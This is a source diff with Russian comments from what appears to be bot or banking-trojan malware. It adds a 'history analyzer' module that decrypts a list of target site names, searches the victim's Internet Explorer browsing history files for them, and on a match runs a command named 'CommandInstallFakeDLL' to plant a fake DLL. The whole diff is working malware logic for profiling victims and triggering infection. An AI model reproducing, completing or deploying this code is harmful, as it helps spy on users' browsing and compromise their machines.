@@ -1,5 +1,12 @@
 //---------------------------------------------------------------------------
 
+#include "Modules.h"
+
+#ifdef HistoryAnalizerH
+//=============================================================================
+
+
+
 #include <windows.h>
 #include <shlobj.h>
 
@@ -10,8 +17,29 @@
 #include "Loader.h"
 #include "Utils.h"
 #include "Task.h"
+#include "StrConsts.h"
 #include "HistoryAnalizer.h"
 
+
+
+
+//-----------------------------------------------------------
+//  Массив ссылок исомых анализатором истории навигации
+//  Строки должны быть разделены нулевым символом и
+//  завершаться пустой строкой
+//-----------------------------------------------------------
+
+#ifndef DEBUGCONFIG
+	// Рабочий массив
+	char HISANALIZER_LINKS[BOTPARAM_SIZE_HISANALIZERLINKS] = BOTPARAM_HISANALIZERLINKS;
+#else
+	// Для отладки
+    char HISANALIZER_LINKS[] = "yandex\0mail.ru\0\0";
+#endif
+//-----------------------------------------------------------
+
+
+/*
 
 const PCHAR HisFileItem = "file:";
 const DWORD MaxSearchFromConfigFileseTime = 10*60*1009;
@@ -52,7 +80,7 @@ bool FindItem(PCHAR Buffer, PCHAR Site, DWORD BufSize)
 
 bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 {
-    PCHAR FileCopy = STR::New(2, FileName, "_copy");
+	PCHAR FileCopy = STR::New(2, FileName, "_copy");
 	if (FileCopy == NULL)
 		return false;
 
@@ -208,6 +236,9 @@ bool SearchFlashPlayerCookies(PHistoryConfig Config)
 
 	return Config->ContainsURL;
 }
+
+
+
 
 //---------------------------------------------------------------------------
 //  HisUtils - Вспомогательнве утилиты анализатора истории
@@ -538,3 +569,132 @@ void HisAnalizer::StartAnalizerThread(PCHAR URL)
 	if (!STR::IsEmpty(URL))
 		StartThread(AnalyzerThreadProc, STR::New(URL));
 }
+
+*/
+
+//*****************************************************************************
+//   Методы анализа истории навигации
+//*****************************************************************************
+namespace HisAnalizer
+{
+
+	//--------------------------------------------------
+	//  Функция загружает список обрабатываемых ссылок
+	//--------------------------------------------------
+	void ReadLinks(TBotStrings &Links)
+	{
+		TStrEnum L(HISANALIZER_LINKS,
+				   BOTPARAM_ENCRYPTED_HISANALIZERLINKS,
+				   BOTPARAM_HASH_HISANALIZERLINKS);
+
+		while (L.Next())
+			Links.Add(L.Line());
+	}
+	//--------------------------------------------------
+
+
+	struct TSearchData
+	{
+		TBotStrings *Links;
+		bool        Contain;
+	};
+
+
+	void CheckIEHistory(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
+	{
+		// Ищем вхождение ссылок в найденном файле истории
+		TSearchData* Data = (TSearchData*)SearchData;
+
+		DWORD  Size = 0;
+		LPBYTE Buf  = File::ReadToBufferA(FileName, Size);
+		if (Buf)
+		{
+			int Count = Data->Links->Count();
+			for (int i = 0; i < Count; i++)
+			{
+				string Link = Data->Links->GetItem(i);
+				int P = STR::Pos((PCHAR)Buf, Link.t_str(), Size, true);
+				if (P >= 0)
+				{
+					Cancel = true;
+					Data->Contain = true;
+					break;
+				}
+			}
+
+
+			MemFree(Buf);
+        }
+	}
+
+
+	//--------------------------------------------------
+	//  Функция ищет совпадения в истории навигации
+	//  Интернет эксплорера
+	//--------------------------------------------------
+	bool CheckIEHistory(TBotStrings &Links)
+	{
+		if (Links.Count())
+		{
+			string Path = GetSpecialFolderPathA(CSIDL_HISTORY, NULL);
+			if (!Path.IsEmpty())
+			{
+				// Перебираем все файлы в директории истории
+
+				TSearchData Data;
+				Data.Links   = &Links;
+				Data.Contain = false;
+
+				SearchFiles(Path.t_str(), "*.dat", true, FA_ANY_FILES, &Data, CheckIEHistory);
+
+				return Data.Contain;
+			}
+		}
+
+		return false;
+    }
+
+
+
+	//--------------------------------------------------
+	//  Функция потока анализа истории навигации
+	//--------------------------------------------------
+	DWORD WINAPI DoExecute(LPVOID)
+	{
+		TBotStrings Links;
+
+		// Читаем ссылки
+		ReadLinks(Links);
+
+		// Анализируем историю навигации
+		bool Executed = CheckIEHistory(Links);
+
+		// В случае обнаружения вхождений, выполняем команду
+		if (Executed)
+		{
+			#ifndef AGENTFULLTEST
+				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(), false);
+			#endif
+        }
+
+		return 0;
+	}
+
+}
+
+
+
+
+//------------------------------------------------------
+// Execute - Фуекция запускает анализ истории навигации
+//------------------------------------------------------
+void HisAnalizer::Execute()
+{
+	StartThread(DoExecute, 0);
+}
+
+
+
+
+//=============================================================================
+#endif
